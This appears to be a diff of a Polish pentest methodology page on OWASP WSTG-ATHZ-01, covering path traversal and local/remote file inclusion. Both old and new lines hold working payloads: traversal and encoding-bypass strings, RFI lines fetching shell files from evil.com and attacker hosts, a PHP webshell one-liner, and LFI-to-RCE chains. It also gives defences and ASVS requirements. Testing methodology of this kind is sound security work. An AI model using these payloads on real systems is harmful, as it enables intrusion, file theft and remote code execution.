@@ -1,102 +1,43 @@
 # WSTG-ATHZ-01 — Testing Directory Traversal File Include
 
-## Cele
+## Cel
 
-- Identify injection points that pertain to path traversal
-- Assess bypassing techniques and identify the extent of path traversal
+Wykrycie path traversal i file inclusion (LFI/RFI) - klasyczny pivot z dostępu do plików konfiguracyjnych (`/etc/passwd`, `web.config`) do RCE (PHP wrappery, log poisoning, session file inclusion).
 
-## KOMENDY
+> **Cross-ref**: główne pokrycie w **WSTG-INPV-11** (LFI/RFI) — ten test (ATHZ-01) skupia się na perspektywie autoryzacji (czy użytkownik powinien mieć dostęp do tego pliku?).
 
-### Podstawowe path traversal
-
-```bash
-curl -s "https://TARGET/file?path=../../../etc/passwd"
-curl -s "https://TARGET/file?path=....//....//....//etc/passwd"
-curl -s "https://TARGET/file?path=..%2f..%2f..%2fetc%2fpasswd"
-curl -s "https://TARGET/file?path=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-curl -s "https://TARGET/file?path=..%252f..%252f..%252fetc%252fpasswd"
-curl -s "https://TARGET/file?path=....\/....\/....\/etc/passwd"
-
-```
-
-### Null byte (starsze PHP)
+## Automatyzacja Nuclei
 
 ```bash
-curl -s "https://TARGET/file?path=../../../etc/passwd%00"
-curl -s "https://TARGET/file?path=../../../etc/passwd%00.jpg"
+# Pełna automatyzacja w INPV-11 (LFI/RFI)
+nuclei -l burp-export.xml -im burp -t templates/wstg-inpv-11-lfi-rfi.yaml
 
+# Również attack-surface (wykrywa source control / config exposure)
+nuclei -l burp-export.xml -im burp -t templates/wstg-info-04-attack-surface.yaml
 ```
 
-### Windows paths
+## Standard pentesterski — jak to robi się wzorowo
 
-```bash
-curl -s "https://TARGET/file?path=..\..\..\..\windows\win.ini"
-curl -s "https://TARGET/file?path=..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+### Metodologia (5 kroków)
 
-```
+1. **Identify file inclusion params**: `?file=`, `?page=`, `?include=`, `?template=`, `?path=`.
+2. **Path traversal probe**: `../../../etc/passwd`, encoding variants, null byte (legacy PHP).
+3. **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php` (source disclosure), `expect://`, `data://` (RCE).
+4. **RFI test**: `?file=http://attacker/shell.txt` jeśli `allow_url_include=On`.
+5. **Log poisoning**: jeśli LFI works, próbować inclusion logu apache + injection XSS przez User-Agent → RCE.
 
-### dotdotpwn
+### Co MUSI być sprawdzone (10 punktów)
 
-```bash
-dotdotpwn -m http -h TARGET -o unix -f /etc/passwd -k "root:" -d 8
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-### PayloadsAllTheThings Directory Traversal
-
-```bash
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/directory_traversal.txt" -mc all -o output_ffuf_traversal.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/deep_traversal.txt" -mc all -o output_ffuf_deep_traversal.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/dotdotpwn.txt" -mc all -o output_ffuf_dotdotpwn.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/Directory Traversal/Intruder/traversals-8-deep-exotic-encoding.txt" -mc all -o output_ffuf_exotic.json
-
-```
-
-### PayloadsAllTheThings File Inclusion
-
-```bash
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/JHADDIX_LFI.txt" -mc all -o output_ffuf_lfi_jhaddix.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Linux-files.txt" -mc all -o output_ffuf_lfi_linux.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/File Inclusion/Intruders/Windows-files.txt" -mc all -o output_ffuf_lfi_windows.json
-
-```
-
-### SecLists LFI
-
-```bash
-ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -o output_ffuf_seclists_lfi.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc all -o output_ffuf_seclists_lfi_linux.json
-
-```
-
-### fuzzdb path traversal
-
-```bash
-ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/path-traversal/traversals-8-deep-exotic-encoding.txt -mc all -o output_ffuf_fuzzdb_trav.json
-
-ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/lfi/JHADDIX_LFI.txt -mc all -o output_ffuf_fuzzdb_lfi.json
-
-```
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Zidentyfikuj parametry ladujace pliki (path=, file=, page=, include=, doc=)
-2. Testuj ../../../etc/passwd i warianty encodowania
-3. Sprawdz RFI: file?path=http://evil.com/shell.php
-4. Testuj PHP wrappers: php://filter/convert.base64-encode/resource=index.php
-5. Testuj bypass filtrow: podwojne kodowanie, null byte, sciezki UNC
-6. Sprawdz PayloadsAllTheThings File Inclusion/README.md dla wrapperow
-
-
----
+- [ ] `../../../etc/passwd` — Linux file read
+- [ ] `..\..\..\windows\win.ini` — Windows
+- [ ] URL encoding `%2e%2e%2f` 
+- [ ] Double encoding `%252e%252e%252f`
+- [ ] Null byte `%00`
+- [ ] PHP wrappers (`php://filter/`, `expect://`, `data:`)
+- [ ] RFI z `http://attacker/shell.txt`
+- [ ] Log poisoning chain
+- [ ] Authorization check: czy authenticated user może czytać cudze pliki?
+- [ ] /proc/self/environ inclusion (sometimes RCE)
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
@@ -104,135 +45,71 @@ ffuf -u "https://TARGET/file?path=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/lfi
 
 ### Path Traversal — mechanizm ataku
 
-- Atakujacy manipuluje sciezka pliku aby uzyskac dostep do plikow poza zamierzonym katalogiem
-- Podstawowy payload: `../../../etc/passwd` — przechodzenie do katalogu nadrzednego
-- Cel: odczyt plikow konfiguracyjnych, kodow zrodlowych, credentials, kluczy prywatnych
-- W polaczeniu z LFI (Local File Inclusion): mozliwe **zdalne wykonanie kodu** (RCE)
+- Atakujący manipuluje ścieżką pliku aby uzyskać dostęp do plików poza zamierzonym katalogiem
+- Podstawowy payload: `../../../etc/passwd` — przechodzenie do katalogu nadrzędnego
+- Cel: odczyt plików konfiguracyjnych, kodów źródłowych, credentials, kluczy prywatnych
+- W połączeniu z LFI (Local File Inclusion): możliwe **zdalne wykonanie kodu** (RCE)
 
-### Techniki bypass filtrow
+### Techniki bypass filtrów
 
 | Technika | Payload | Opis |
 |----------|---------|------|
-| Podwojne ../  | `....//....//etc/passwd` | Filtr usuwa `../` raz, zostaje `../` |
+| Podwójne ../  | `....//....//etc/passwd` | Filtr usuwa `../` raz, zostaje `../` |
 | URL encoding | `%2e%2e%2f` | Dekodowanie po walidacji |
-| Double encoding | `%252e%252e%252f` | Podwojne dekodowanie |
+| Double encoding | `%252e%252e%252f` | Podwójne dekodowanie |
 | Null byte | `../../../etc/passwd%00.jpg` | PHP < 5.3.4 obcina po null byte |
 | Backslash (Windows) | `..\..\..\..\windows\win.ini` | Windows path separator |
-| UNC path | `\\evil.com\share\file` | Dostep do zdalnych zasobow |
+| UNC path | `\\evil.com\share\file` | Dostęp do zdalnych zasobów |
 | UTF-8 encoding | `..%c0%af..%c0%af` | Overlong UTF-8 encoding |
 
 ### Obrona — wielowarstwowa
 
-- **Walidacja wejscia**: allowlist dozwolonych znakow (alfanumeryczne + kropka + myslnik)
-- **Kanonizacja sciezki**: uzyj `realpath()`, `Path.normalize()` PRZED walidacja
-- **Chroot/jail**: ograniczaj dostep do pliku do jednego katalogu
-- **Nie uzywaj danych uzytkownika w sciezkach plikow** — mapuj na ID/hash
-- **Odrzucaj**: `..`, `%2e`, null bytes, backslash, `://` w parametrach sciezki
-- Po kanonizacji sprawdz czy sciezka **zaczyna sie od dozwolonego katalogu bazowego**
+- **Avoid file paths from user input**: użyj indirect references (mapping ID → file)
+- **Allowlist** dozwolonych plików — denylist niewystarczający
+- **Walidacja path normalizacji**: `realpath()` w PHP, `Path.GetFullPath()` w .NET → sprawdź że result jest w expected directory
+- **Chroot/jail** procesu webowego — nie pozwól na dostęp poza document root
+- **File permissions**: web user (www-data) nie powinien mieć dostępu do `/etc/`, `/root/`, etc.
 
-### LFI (Local File Inclusion) — dodatkowe wektory
+### LFI to RCE — chains
 
-- **PHP wrappers**: `php://filter/convert.base64-encode/resource=index.php` — odczyt kodu zrodlowego
-- **PHP input**: `php://input` z POST body — wykonanie kodu
-- **Data wrapper**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
-- **Log poisoning**: wstrzyknij kod do log file, potem zaladuj log przez LFI
-- **Session file inclusion**: `/tmp/sess_<session_id>` z wstrzyknietym payloadem
-- **proc/self/environ**: zawiera HTTP headers — wstrzyknij payload w User-Agent
+- **Log poisoning**: LFI + log file inclusion + User-Agent z `<?php` → RCE
+- **Session file inclusion**: PHP session w `/tmp/sess_*` z PHP code → RCE
+- **PHP wrappers**: `php://filter` (source), `expect://` (RCE), `data://` (RCE)
+- **/proc/self/environ**: User-Agent reflectowane w env vars → RCE w starszych systemach
 
-### RFI (Remote File Inclusion)
+## Pentesterskie deep dive
 
-- `file?path=http://evil.com/shell.php` — zaladuj zdalny plik z kodem
-- Wymaga `allow_url_include=On` w PHP (domyslnie wylaczone)
-- Testuj rowniez z `https://`, `ftp://`, `gopher://`
+### Mniej znane techniki
 
-### Pliki do testowania (cele path traversal)
+- **Authorization aspect of path traversal**: nawet jeśli aplikacja blokuje `../etc/passwd`, czy authenticated user może czytać user_B's files (`?file=user_B/private.pdf`)? IDOR + path traversal hybrid.
+- **PHP filter chain (CVE-2023-...)**: chain `php://filter/convert.base64-decode|...|...` może evade restrictions.
+- **Race condition w file upload + traversal**: upload + symlink traversal.
 
-| System | Plik | Zawartosc |
-|--------|------|-----------|
-| Linux | `/etc/passwd` | Lista uzytkownikow |
-| Linux | `/etc/shadow` | Hashe hasel (wymaga root) |
-| Linux | `/etc/hosts` | Konfiguracja DNS |
-| Linux | `/proc/self/environ` | Zmienne srodowiskowe |
-| Windows | `C:\windows\win.ini` | Konfiguracja Windows |
-| Windows | `C:\windows\system32\config\SAM` | Baza hasel |
-| Aplikacja | `WEB-INF/web.xml` | Konfiguracja Java |
-| Aplikacja | `.env` | Zmienne srodowiskowe aplikacji |
+### Common pitfalls
 
-## ROZSZERZENIA BURP SUITE
+- **realpath() bez verification że jest w allowed dir**: realpath canonicalizes ale nie waliduje location.
+- **Allowlist on filename only, not path**: `getFile("config.php")` ignoruje że path zawiera `../`.
 
-| Rozszerzenie | Opis | Link |
-|---|---|---|
-| off-by-slash | Wykrywanie alias traversal przez bledna konfiguracje NGINX | [GitHub](https://github.com/bayotop/off-by-slash) |
-| 403Bypasser | Automatyczne techniki omijania restrykcji 403 | [GitHub](https://github.com/sting8k/BurpSuite_403Bypasser) |
+### Świeżynki z research
 
----
+- **PortSwigger Path Traversal Lab**: https://portswigger.net/web-security/file-path-traversal
+- **HackTricks LFI**: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
-## Wskazówki ASVS
+## Rozszerzenia Burp Suite
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
+| Rozszerzenie | Opis |
+|---|---|
+| Param Miner | Hidden file params discovery |
 
-### L1 (Podstawowy)
+## Źródła
 
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V5.3.2 | File Storage | Verify that when the application creates file paths for file operations, instead of user-submitted filenames, it uses internally generated or trusted data, or if user-submitted filenames or file metadata must be used, strict validation and sanitization must be applied. This is to protect against path traversal, local or remote file inclusion (LFI, RFI), and server-side request forgery (SSRF) attacks. |
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include
+- OWASP Input Validation CS: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
+- HackTricks LFI: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
-### L2 (Standardowy)
+### Wskazówki ASVS
 
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V1.3.6 | Sanitization | Verify that the application protects against Server-side Request Forgery (SSRF) attacks, by validating untrusted data against an allowlist of protocols, domains, paths and ports and sanitizing potentially dangerous characters before using the data to call another service. |
-
-### L3 (Zaawansowany)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V5.3.3 | File Storage | Verify that server-side file processing, such as file decompression, ignores user-provided path information to prevent vulnerabilities such as zip slip. |
-
-
----
-
-## HackTricks Tips
-
-### Traversal Bypass
-
-```
-....//....//etc/passwd          # double-dot po strip
-..%252f..%252fetc%252fpasswd   # double URL-encode
-..%c0%af..%c0%afetc%c0%afpasswd  # overlong UTF-8
-/%5C../%5C../etc/passwd         # backslash URL-encoded
-```
-
-**Python `os.path.join` bypass**: `/etc/passwd` (absolute) odrzuca wszystkie poprzednie komponenty
-
-### PHP Wrappers → RCE
-
-- `php://input` + POST: `<?php system($_GET['cmd']); ?>`
-- `php://filter/convert.base64-encode/resource=/etc/passwd`
-- `data://text/plain;base64,<base64_shell>`
-- `zip://shell.jpg%23payload.php` — upload zip z .php renamed na .jpg
-- `phar://uploaded.phar` — trigger deserialization
-- `expect://id` — jeśli expect extension
-
-### LFI → RCE (bez file write!)
-
-- **PHP Filter Chain Generator**: `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` — generuje `php://filter/...` chain dekodujący do arbitrary PHP
-- **CVE-2024-2961**: arbitrary file read via PHP filters → RCE via 3-byte heap overflow
-
-### LFI → RCE via Nginx temp files
-
-1. Znajdź nginx worker PID: `?file=/proc/<pid>/cmdline`
-2. Wyślij duży POST (>8KB) → nginx buffer spill do `/var/lib/nginx/body/`
-3. Trzymaj TCP connection otwartą → nginx nie unlink'uje fd
-4. Brute fd 10-45: `?file=/proc/<nginx_pid>/fd/<fd>`
-
-### LFI → RCE via phpinfo() race
-
-1. POST multipart do phpinfo() z PHP payload + ~6KB padding
-2. Parse `$_FILES[tmp_name]` z partial output
-3. Natychmiast fire LFI: `?file=/tmp/phpXXXXXX` przed cleanup
-4. Windows wildcard: `?inc=c:\windows\temp\php<<` (FindFirstFile)
-
-### Top parametry do fuzzowania
-
-`?file=`, `?page=`, `?path=`, `?include=`, `?doc=`, `?view=`, `?download=`
+| ID | Wymaganie |
+|---|---|
+| V12.3.1 | File path validation against canonicalization. |
+| V5.3.10 | LFI defense via allowlists. |
